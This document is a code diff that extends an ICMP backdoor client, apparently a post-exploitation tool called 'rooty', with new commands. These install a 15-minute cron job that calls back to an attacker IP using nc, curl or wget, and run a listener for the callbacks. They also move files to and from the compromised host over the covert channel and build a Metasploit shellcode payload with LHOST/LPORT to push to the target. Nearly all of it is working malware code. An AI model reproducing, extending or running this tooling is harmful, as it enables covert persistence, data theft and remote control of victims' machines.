@@ -3,7 +3,9 @@ import thread
 import threading,time
 import getopt
 
+#Global Args
 cmdout = []
+outputdelay = (200.0 / 1000.0)
 
 
 ########## functions ############
@@ -129,20 +131,21 @@ if shellcode_file != "":
 # Create the listener thread
 thread.start_new_thread(start_listener, (iface, None))
 
-#Ghetto output, but works
+#Ghetto wau to ensure I got all output
 def cmdoutput(line):
    global cmdout
+   global outputdelay
    key_info = generate_key_info()
    key = generate_key(key_info)
    encrypted_data = crypt_data(magic + "\x02" + line, key)
    send(build_pkt(src_ip, dst_ip, encrypted_data, key_info), verbose=0)
    
    len1 = len(cmdout)
-   time.sleep(100.0 / 1000.0)
+   time.sleep(outputdelay)
    while 1:
       if len(cmdout) != len1:
           len1 = len(cmdout)
-          time.sleep(100.0 / 1000.0)
+          time.sleep(outputdelay)
       else:
           break
       for i in cmdout:
@@ -175,34 +178,113 @@ class Shell(cmd.Cmd):
         output = os.popen(line).read()
         print output
 
-    def do_get(self, line):
-      "Get a File with xxd"
-      filename = line.split('/')
-      filename = filename[len(filename)-1]
-      hexfile = cmdoutput("xxd -p "+line)
-      print "Lines: "+len(hexfile) 
-      f = open("/tmp/.binbin", "w+")
-      for line in hexfile:
-        f.write(line)
-      f.close()
-      os.popen("xxd -p -r /tmp/.binbin > ./"+filename).read()
-      output = os.popen("ls -latr ./"+filename).read()
-      print output
-      print "Get File Complete"
-
-    def do_put(self, line):
-      "Upload a File with xxd, file goes to /tmp/.filename"
-      filename = line.split('/')
-      filename = filename[len(filename)-1]
-      put = os.popen("xxd -p "+line+"").read()
-      puthex = put.split('\n')
+    def do_setdelay(self,line):
+        "Set the delay time in seconds for output, when network latency is high, or you expect alot of output"
+        line = line.rstrip('\n')
+        global outputdelay
+        outputdelay = (int(line))
+    
+    def do_phonehome_install(self, line):
+      "Add 15 min cronjob to send GET or keyword to http server, syntax <ip> <port> <keyword> ex phonehome 192.168.1.33 443 hello"
+      line = line.rstrip('\n')
+      if line == "":
+         print "Invalid, example: phonehome 192.168.1.33 GET"
+      else:
+        linenew = line.split()
+        if len(linenew) == 3:
+           ip = linenew[0]
+           if linenew[1].isdigit():
+             port = linenew[1]
+           else:
+             print "you enter invalid port: defaulting to 443"
+             port = "443"
+           keyword = linenew[2]
+        elif len(linenew) == 2:
+           ip = linenew[0]
+           if linenew[1].isdigit():
+             port = linenew[1]
+           print "No Keyword defaulting to GET"
+           keyword = "GET"
+        else:
+           ip = line
+           port = "443"
+           keyword = "GET"
+           print "You did not enter keyword or port, default port 443,  default keyword to GET"
+        tools = []
+        tools.append(cmdoutput("which nc && echo truenc"))
+        tools.append(cmdoutput("which telnet && echo truetelnet"))
+        tools.append(cmdoutput("which netcat && echo truenetcat"))
+        tools.append(cmdoutput("which curl && echo truecurl"))
+        tools.append(cmdoutput("which wget && echo truewget"))
+     # tools[5] = cmdoutput("which ping && echo trueiping")
+        for i in tools:
+         if i != None:
+           print i 
+           if str(i).find('true') > -1:
+               command = ("echo "+keyword+" | "+i[0]+" "+ip+" "+port)
+               cron = "crontab -l | { cat; echo \"*/15 * * * * "+command+" >/dev/null 2>&1\"; } | crontab -"
+               print "Cron Job Added: "+cron
+               cmdoutput(cron)
+               break
       
-      for i in puthex:
-         cmdoutput("echo "+i+" >> /tmp/.bin")
-      cmdoutput("xxd -p -r /tmp/.bin >> /tmp/."+filename)
-      cmdoutput("ls -latr /tmp/."+filename)
-      cmdoutput("rm /tmp/.bin")
-      print "Upload Complete"
+
+
+    def do_phonehome_listener(self, line):
+      "Start an http web server on specfici port, ex phonehome_listener 8080"
+      line = line.rstrip('\n')
+      os.system("python -m SimpleHTTPServer "+line+" &> /tmp/.phonehome & echo $! > /tmp/.phonehomepid")
+      os.system("cat /tmp/.phonehomepid")
+      print "HTTP Server setup, run phonehome_check to verify whos calling back"
+
+
+    def do_phonehome_check(self, line):
+      "Check whos calling back, enter an ip/or word you want to filter, or empty for all results"
+      line = line.rstrip('\n')
+      if line == "":
+        os.system("cat /tmp/.phonehome | grep -v syntax")
+
+    def do_phonehome_clear(self,line):
+       "Clean the phone home log"
+       os.system("touch /tmp/.phonehome")
+       print "Complete"
+
+      
+    def do_getxxd(self, line):
+      "Get a File with xxd"
+      output = cmdoutput("which xxd && echo true")
+      if str(output).find("true") > -1:
+         filename = line.split('/')
+         filename = filename[len(filename)-1]
+         hexfile = cmdoutput("xxd -p "+line)
+         print "Lines: "+str(len(hexfile)) 
+         f = open("/tmp/.binbin", "w+")
+         for line in hexfile:
+           f.write(line)
+         f.close()
+         os.popen("xxd -p -r /tmp/.binbin > ./"+filename).read()
+         output = os.popen("ls -latr ./"+filename).read()
+         print output
+         print "Get File Complete"
+      else:
+         print "Box does not have xxd, unsupported."
+
+    def do_putxxd(self, line):
+      "Upload a File with xxd, file goes to /tmp/.filename"
+      output = cmdoutput("which xxd && echo true")
+      if str(output).find("true") > -1:
+         filename = line.split('/')
+         filename = filename[len(filename)-1]
+         put = os.popen("xxd -p "+line+"").read()
+         puthex = put.split('\n')
+      
+         for i in puthex:
+            cmdoutput("echo "+i+" >> /tmp/.bin")
+         cmdoutput("xxd -p -r /tmp/.bin >> /tmp/."+filename)
+         cmdoutput("ls -latr /tmp/."+filename)
+         cmdoutput("rm /tmp/.bin")
+         print "Upload Complete"
+      else:
+         print "Box does not have xxd, unsupported."
 
     
     def do_clear(self,line):
@@ -229,7 +311,7 @@ class Shell(cmd.Cmd):
         print "Dude you didnt enter a pid... ex: persist 5141"
 
     def do_showmyproc(self,line):
-      "Display the icmp backdoor process name, may not be accurate if you spawned this yourself..."
+      "Display the icmp backdoor process name, may only not be accurate..."
       cmdoutput("cat /proc/$PPID/cmdline && echo \" PID: $PPID\"")
 
     def do_prompt(self, line):
@@ -244,18 +326,45 @@ class Shell(cmd.Cmd):
 
     def do_find(self, line):
       "Find a file, enter only find and the filename"
+      line = line.rstrip('\n')
       cmdoutput('find / ' + "| grep "+line + "> /tmp/.keyring-2WEFPj" )
       time.sleep(5)
       cmdoutput('cat /tmp/.keyring-2WEFPj')
+
+    def do_msfpayloadvbuilder(self, line):
+      "Build/Upload Metasploit Payload, Requires MSFPAYLOAD on local box"
+      global shellcode_file
+      print "Listing all msfpayloads for linux/unix, please wait..."
+      while True:
+          output = os.popen("msfpayload -l | egrep  \'(linux|unix)\'").read()
+          output = output.split('\n')
+          payloads = []
+          for i in output:
+             if "/" not in i:
+                continue
+             i = i.split()
+             payloads.append(i[0])
+          count = 1
+          for i in payloads:
+            print str(count)+" : "+i
+            count += 1
+          inputnum = raw_input("Pick a Payload Number: ")
+          lhost = raw_input("LHOST: ")
+          lport = raw_input("LPORT: ")
+          print "Building Shellcode Please Wait...."
+          print("msfpayload "+payloads[int(inputnum)-1]+" LHOST="+lhost+" LPORT="+lport+" R > /tmp/.shellcode")
+          os.system("msfpayload "+payloads[int(inputnum)-1]+" LHOST="+lhost+" LPORT="+lport+" R > /tmp/.shellcode")
+          shellcode_file = "/tmp/.shellcode"
+          send_shellcode()
+          print "Uploading shellcode"
+          break
+          
     
     def do_exit(self, line):
       "Exit the shell"
       print "Good Bye"
       exit(0)
 
-
-    def do_EOF(self, line):
-        return True
     
 if __name__ == '__main__':
-    Shell().cmdloop('ICMP Backdoor Interactive Shell (m0r3sh3lls)')
+    Shell().cmdloop('ICMP Backdoor (rooty) with Interactive Shell (m0r3sh3lls)')
